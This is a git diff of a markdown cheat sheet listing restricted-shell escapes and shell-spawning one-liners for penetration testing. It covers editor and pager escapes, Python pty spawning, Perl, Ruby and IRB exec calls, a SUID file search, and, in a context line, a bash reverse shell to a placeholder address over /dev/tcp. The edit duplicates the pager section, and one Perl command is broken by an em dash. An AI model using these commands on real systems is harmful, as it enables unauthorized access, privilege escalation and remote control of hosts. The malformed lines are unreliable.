@@ -35,17 +35,24 @@ find / -perm /6001
 find /home -exec sh -i \;
 ```
 ## use text editors vim, vi, nano, pico, ed
-```
-  a. :!/bin/sh, !/bin/zsh, try other shells!?!?
-  b. :shell
-  c. :set shell=/bin/sh
-```
+
+1. :!/bin/sh, !/bin/zsh, try other shells!?!?
+2. :shell
+3. :set shell=/bin/sh
+4. :set shell=/bin/bash:shell
+5. :!bash
+
+## use pagers less, more, or programs like man that use less or more by default
+1. !/bin/sh, !/bin/zsh, try other shells!?!?
+2. !/bin/bash
+3. !bash
+
 
 ## use pagers less, more, or programs like man that use less or more by default
 ```
-  a. !/bin/sh, !/bin/zsh, try other shells!?!?
-  b. !/bin/bash
-  c. !bash
+1. !/bin/sh, !/bin/zsh, try other shells!?!?
+2. !/bin/bash
+3. !bash
 ```
 
 ## use awk command
@@ -88,7 +95,14 @@ bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
 ## Python:
 ```
 import os; os.system("/bin/sh")
-python -c ‘import pty;pty.spawn(“/bin/bash”);’
+```
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 ## PHP:
@@ -108,8 +122,15 @@ exec("sh -i");
 ```
 exec "/bin/sh";
 ```
+```
+perl —e 'exec "/bin/sh";'
+```
 
 ## Ruby:
+```
+exec "/bin/sh"
+```
+## IRB:
 ```
 exec "/bin/sh"
 ```
